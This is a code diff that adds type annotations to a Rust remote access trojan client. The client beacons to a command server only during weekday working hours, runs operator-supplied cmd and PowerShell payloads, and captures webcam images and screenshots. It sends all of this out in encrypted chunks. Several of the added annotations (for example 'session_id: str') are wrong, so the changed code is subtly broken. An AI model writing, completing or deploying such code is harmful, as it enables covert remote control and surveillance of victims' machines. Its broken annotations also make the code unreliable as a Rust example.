@@ -49,7 +49,7 @@ const LOGGING: bool = true;
 fn log_it(message: &str) {
     if LOGGING {
         if let Some(mut file) = LOG_STREAM.lock().unwrap().as_mut() {
-            let timestamp = SystemTime::now()
+            let timestamp: u64 = SystemTime::now()
                 .duration_since(UNIX_EPOCH)
                 .unwrap()
                 .as_secs();
@@ -59,32 +59,32 @@ fn log_it(message: &str) {
 }
 
 fn get_session_id(client: &TcpStream) -> Result<String, Box<dyn std::error::Error>> {
-    let peer_addr = client.peer_addr()?;
-    let ip_address = peer_addr.ip().to_string();
+    let peer_addr: std::net::SocketAddr = client.peer_addr()?;
+    let ip_address: String = peer_addr.ip().to_string();
     log_it(&format!("IP Address: {}", ip_address));
     
     let sum: u32 = ip_address
         .split('.')
-        .map(|octet| octet.parse::<u32>().unwrap_or(0))
+        .map(|octet: &str| octet.parse::<u32>().unwrap_or(0))
         .sum();
     
     let mut hasher = Sha256::new();
     hasher.update(format!("{}<>{}", ip_address, sum));
     let result = hasher.finalize();
-    let crypt = hex::encode(&result)[..32].to_string();
+    let crypt: String = hex::encode(&result)[..32].to_string();
     
     log_it(&format!("Session ID: {}", crypt));
     Ok(crypt)
 }
 
 fn encrypt_data(data: &str, shared_key: &str) -> Result<String, Box<dyn std::error::Error>> {
-    let mut salt = [0u8; 32];
+    let mut salt: [u8; 32] = [0u8; 32];
     rand::thread_rng().fill_bytes(&mut salt);
     
-    let mut key = [0u8; 32];
+    let mut key: [u8; 32] = [0u8; 32];
     pbkdf2_hmac::<Sha512>(shared_key.as_bytes(), &salt, 200_000, &mut key);
     
-    let mut iv = [0u8; 12];
+    let mut iv: [u8; 12] = [0u8; 12];
     rand::thread_rng().fill_bytes(&mut iv);
     
     let key = Key::from_slice(&key);
@@ -94,9 +94,9 @@ fn encrypt_data(data: &str, shared_key: &str) -> Result<String, Box<dyn std::err
     let ciphertext = cipher.encrypt(nonce, data.as_bytes())
         .map_err(|e| format!("Encryption failed: {:?}", e))?;
     
-    let salt_b64 = base64::encode(salt);
-    let iv_b64 = base64::encode(iv);
-    let ciphertext_b64 = base64::encode(ciphertext);
+    let salt_b64: String = base64::encode(salt);
+    let iv_b64: String = base64::encode(iv);
+    let ciphertext_b64: String = base64::encode(ciphertext);
     
     Ok(format!("{}:{}:{}", salt_b64, iv_b64, ciphertext_b64))
 }
@@ -107,18 +107,18 @@ fn decrypt_data(encrypted: &str, shared_key: &str) -> Result<String, Box<dyn std
         return Err("Invalid encrypted data format".into());
     }
     
-    let salt = base64::decode(parts[0])?;
-    let iv = base64::decode(parts[1])?;
-    let ciphertext = base64::decode(parts[2])?;
+    let salt: Vec<u8> = base64::decode(parts[0])?;
+    let iv: Vec<u8> = base64::decode(parts[1])?;
+    let ciphertext: Vec<u8> = base64::decode(parts[2])?;
     
-    let mut key = [0u8; 32];
+    let mut key: [u8; 32] = [0u8; 32];
     pbkdf2_hmac::<Sha512>(shared_key.as_bytes(), &salt, 200_000, &mut key);
     
     let key = Key::from_slice(&key);
     let nonce = Nonce::from_slice(&iv);
     
     let cipher = Aes256Gcm::new(key);
-    let plaintext = cipher.decrypt(nonce, ciphertext.as_ref())
+    let plaintext: Vec<u8> = cipher.decrypt(nonce, ciphertext.as_ref())
         .map_err(|e| format!("Decryption failed: {:?}", e))?;
     
     Ok(String::from_utf8(plaintext)?)
@@ -129,14 +129,14 @@ fn get_retry_interval(retries: usize) -> u64 {
 }
 
 async fn send_command(response: serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
-    let session_id = SESSION_ID.lock().unwrap().clone().ok_or("Session ID not set")?;
-    let encrypted = encrypt_data(&serde_json::to_string(&response)?, &session_id)?;
+    let session_id: str = SESSION_ID.lock().unwrap().clone().ok_or("Session ID not set")?;
+    let encrypted: String = encrypt_data(&serde_json::to_string(&response)?, &session_id)?;
     
     if encrypted.len() >= CHUNK_SIZE {
-        let mut remaining = encrypted;
+        let mut remaining: String = encrypted;
         while !remaining.is_empty() {
             let (chunk, rest) = remaining.split_at(std::cmp::min(CHUNK_SIZE, remaining.len()));
-            let mut chunk = chunk.to_string();
+            let mut chunk: String = chunk.to_string();
             if rest.is_empty() {
                 chunk += "--FIN--";
             }
@@ -153,8 +153,8 @@ async fn send_command(response: serde_json::Value) -> Result<(), Box<dyn std::er
 }
 
 async fn send_beacon() -> Result<(), Box<dyn std::error::Error>> {
-    let sys = System::new_all();
-    let response = serde_json::json!({
+    let sys: System = System::new_all();
+    let response: serde_json::Value = serde_json::json!({
         "response": {
             "beacon": true,
             "version": CVER,
@@ -177,7 +177,7 @@ fn utf8_to_16(s: &str) -> Vec<u16> {
 }
 
 fn format_file_name(name: &str, extension: &str) -> String {
-    let now = chrono::Local::now();
+    let now: chrono::DateTime<Local> = chrono::Local::now();
     format!("{}_{}_{}.{}", 
         name,
         now.format("%Y-%m-%d"),
@@ -188,7 +188,7 @@ fn format_file_name(name: &str, extension: &str) -> String {
 
 async fn run_webcam_clip() -> Result<(), Box<dyn std::error::Error>> {
     // Set the file name for saving the image
-    let file_name = format_file_name("wc", "jpg");
+    let file_name: String = format_file_name("wc", "jpg");
 
     // Open the default camera (index 0)
     let mut camera = videoio::VideoCapture::new(0, videoio::CAP_ANY)?;
@@ -208,11 +208,11 @@ async fn run_webcam_clip() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     // Encode the frame as JPEG
-    let mut buf = Vec::new();
+    let mut buf: Vec<u8> = Vec::new();
     imgcodecs::imencode(".jpg", &frame, &mut buf, &core::Vector::new())?;
 
     // Convert the image buffer to base64
-    let encoded_image = base64::encode(&buf);
+    let encoded_image: String = base64::encode(&buf);
 
     // Send the command (assuming send_command is defined elsewhere)
     send_command(serde_json::json!({
@@ -226,10 +226,10 @@ async fn run_webcam_clip() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 async fn run_screenshot() -> Result<(), Box<dyn std::error::Error>> {
-    let file_name = format_file_name("ss", "jpg");
+    let file_name: String = format_file_name("ss", "jpg");
     
-    let screen = screenshots::Screen::all()?[0];
-    let image = screen.capture()?;
+    let screen: Screen = screenshots::Screen::all()?[0];
+    let image: screenshots::image::ImageBuffer<screenshots::image::Rgba<u8>, Vec<u8>> = screen.capture()?;
     let buffer = image.buffer();
 
     send_command(serde_json::json!({
@@ -243,7 +243,7 @@ async fn run_screenshot() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<String, Box<dyn std::error::Error>> {
-    let command = command.trim();
+    let command: &str = command.trim();
     if command.is_empty() {
         return Err("No command provided.".into());
     }
@@ -251,7 +251,7 @@ async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<Stri
         return Err("Unsupported command.".into());
     }
 
-    let mut cmd = Command::new(if command == "cmd" { "cmd.exe" } else { "powershell.exe" });
+    let mut cmd: Command = Command::new(if command == "cmd" { "cmd.exe" } else { "powershell.exe" });
 
     match command {
         "cmd" => {
@@ -278,7 +278,7 @@ async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<Stri
         _ => unreachable!(),
     }
 
-    let output = cmd.output().await?;
+    let output: <<Result<std::process::Output, std::io::Error> as IntoFuture>::Output as Try>::Output = cmd.output().await?;
     if !output.status.success() {
         return Err(format!("Command failed with code {}. Error output: {}", 
                            output.status.code().unwrap_or(-1), 
@@ -289,18 +289,18 @@ async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<Stri
 }
 
 fn format_time(milliseconds: u64) -> String {
-    let total_seconds = milliseconds / 1000;
-    let days = total_seconds / 86400;
-    let hours = (total_seconds % 86400) / 3600;
-    let minutes = (total_seconds % 3600) / 60;
-    let seconds = total_seconds % 60;
+    let total_seconds: u64 = milliseconds / 1000;
+    let days: u64 = total_seconds / 86400;
+    let hours: u64 = (total_seconds % 86400) / 3600;
+    let minutes: u64 = (total_seconds % 3600) / 60;
+    let seconds: u64 = total_seconds % 60;
     format!("{}d {}h {}m {}s", days, hours, minutes, seconds)
 }
 
 async fn get_uptime() -> Result<(), Box<dyn std::error::Error>> {
-    let start = *START_TIME.lock().unwrap();
-    let uptime = SystemTime::now().duration_since(start)?;
-    let formatted_uptime = format_time(uptime.as_millis() as u64);
+    let start: SystemTime = *START_TIME.lock().unwrap();
+    let uptime: Duration = SystemTime::now().duration_since(start)?;
+    let formatted_uptime: String = format_time(uptime.as_millis() as u64);
     
     send_command(serde_json::json!({
         "response": {
@@ -317,16 +317,16 @@ async fn parse_action(action: &str) -> Result<(), Box<dyn std::error::Error>> {
         return Err("No action provided".into());
     }
 
-    let command = parts[0];
-    let properties = &parts[1..];
+    let command: &str = parts[0];
+    let properties: &[&str] = &parts[1..];
 
     match command {
         "ps" | "cmd" => {
             if properties.is_empty() {
                 return Err("No payload provided".into());
             }
-            let payload = String::from_utf8(base64::decode(properties[0])?)?;
-            let result = run_command(command, &payload, false).await?;
+            let payload: String = String::from_utf8(base64::decode(properties[0])?)?;
+            let result: String = run_command(command, &payload, false).await?;
             send_command(serde_json::json!({"response": {"data": result}})).await?;
         },
         "up" => {
@@ -349,7 +349,7 @@ async fn parse_action(action: &str) -> Result<(), Box<dyn std::error::Error>> {
 }
 
 fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
-    let mut retry_count = 0;
+    let mut retry_count: u32 = 0;
 
     loop {
         match TcpStream::connect((SERVER_ADDRESS, SERVER_PORT)) {
@@ -357,24 +357,24 @@ fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
                 log_it("Client connected");
                 *CLIENT.lock().unwrap() = Some(stream.try_clone()?);
 
-                let session_id = get_session_id(&CLIENT.lock().unwrap().as_ref().unwrap())?;
+                let session_id: String = get_session_id(&CLIENT.lock().unwrap().as_ref().unwrap())?;
                 *SESSION_ID.lock().unwrap() = Some(session_id);
 
                 send_beacon()?;
 
-                let beacon_interval = rand::thread_rng().gen_range(BEACON_MIN_INTERVAL..=BEACON_MAX_INTERVAL);
-                let start_time = Instant::now();
+                let beacon_interval: u64 = rand::thread_rng().gen_range(BEACON_MIN_INTERVAL..=BEACON_MAX_INTERVAL);
+                let start_time: Instant = Instant::now();
 
                 loop {
                     if start_time.elapsed().as_millis() >= beacon_interval as u128 {
-                        let now = Local::now();
+                        let now: chrono::DateTime<Local> = Local::now();
                         if now.weekday().num_days_from_monday() < 5 && (7..=19).contains(&now.hour()) {
                             send_beacon()?;
                         }
                         break;
                     }
 
-                    let mut buffer = [0; 1024];
+                    let mut buffer: [u8; 1024] = [0; 1024];
                     match stream.read(&mut buffer) {
                         Ok(0) => {
                             log_it("Connection closed by server");
@@ -383,8 +383,8 @@ fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
                         Ok(n) => {
                             let data = String::from_utf8_lossy(&buffer[..n]);
                             log_it(&format!("Received data: {}", data));
-                            let session_id = SESSION_ID.lock().unwrap().clone().unwrap();
-                            let decrypted = decrypt_data(&data, &session_id)?;
+                            let session_id: str = SESSION_ID.lock().unwrap().clone().unwrap();
+                            let decrypted: String = decrypt_data(&data, &session_id)?;
                             parse_action(&decrypted)?;
                         }
                         Err(e) => {
@@ -405,7 +405,7 @@ fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
                     thread::sleep(Duration::from_millis(BEACON_MAX_INTERVAL * 8));
                     return Ok(());
                 }
-                let retry_interval = get_retry_interval(retry_count as usize);
+                let retry_interval: u64 = get_retry_interval(retry_count as usize);
                 log_it(&format!("Retrying in {} seconds...", retry_interval / 1000));
                 thread::sleep(Duration::from_millis(retry_interval));
                 retry_count += 1;
